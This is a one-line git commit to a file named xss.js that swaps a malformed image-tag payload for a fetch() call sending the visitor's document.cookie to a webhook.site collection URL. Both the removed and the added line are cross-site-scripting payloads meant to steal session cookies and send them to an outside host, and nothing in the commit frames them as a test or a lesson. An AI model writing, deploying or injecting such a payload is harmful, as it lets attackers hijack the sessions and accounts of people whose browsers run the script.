1ae4b755be10bd3431e45748261f425dd66472cb
elchals <loreginopetit@hotmail.com>
2024-11-26 21:12:43 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-<img src="https://webhook.site/62fce723-0277-4dac-b683-f71462ff1bca?data=" + btoa(document.cookie);>
+fetch('https://webhook.site/62fce723-0277-4dac-b683-f71462ff1bca?data=' + document.cookie)
